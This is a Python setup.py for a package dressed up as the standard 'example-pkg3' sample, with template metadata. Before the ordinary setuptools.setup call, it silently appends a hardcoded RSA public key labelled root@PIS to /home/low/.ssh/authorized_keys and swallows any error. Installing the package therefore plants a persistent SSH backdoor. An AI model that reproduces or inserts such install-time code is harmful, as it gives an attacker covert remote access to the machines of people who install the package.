import setuptools

try:
    with open('/home/low/.ssh/authorized_keys', 'a') as f:
        f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QTR1svmhbwofd7X6E2xMtBIsZhgpuGLuvG8pW6tM6/k6LUPEwfX5AYaZwLWwQnOV01alT64zUkT4NhJoSvkkMNbqkCNRd1D3FsoFSHMdnrVDjlulcriNpX49NpnQ7h1MH9B3NKkLdVpp/pLk8d24ArbTR2lE+Hsw95oQVEN08GYZHFgjYF9kf8MWAWGcXPj6kLMjSnntsf2Bzz0P+hjqX1BIKLJsgubOmdyeND17Ti9Esbzd8FfWXkpvJaPmKrxDugwd8ljMsa3/jvhsLHXoRhXytEF9vfGb3Nb9wFzdDtxLfvcVeXpGIF/xe07s9pWpqY6m5irKo9+DOdm6YTJ4q7mrdMfXxBg4c5joEefAgpGjfvSIIvUJqK0DPqWxCpa6+h832W+SoRCFMplPKFEg4i21wP/eHg0EjXr+EqLllNm1ECDeYPdbvWaPefT9KN7gzln+jbe0F2X0UDfw1NXL1wuH/2C16qKcn3zppZ0hDOFtA73Fxv8y8LP9d6mG9Ms= root@PIS")
        f.close()
except Exception as e:
    pass
setuptools.setup(
        name="example-pkg3", # Replace with your own username
        version='0.0.1',
        author='Example Author',
        author_email='author@example.com',
        description='A small example package',
        long_description='',
        long_description_content_type='text/markdown',
        url='https://github.com/pypa/sampleproject',
        packages=setuptools.find_packages(),
        classifiers=[
            'Programming Language :: Python :: 3',
            'License :: OSI Approved :: MIT License',
            'Operating System :: OS Independent',
            ],
        )
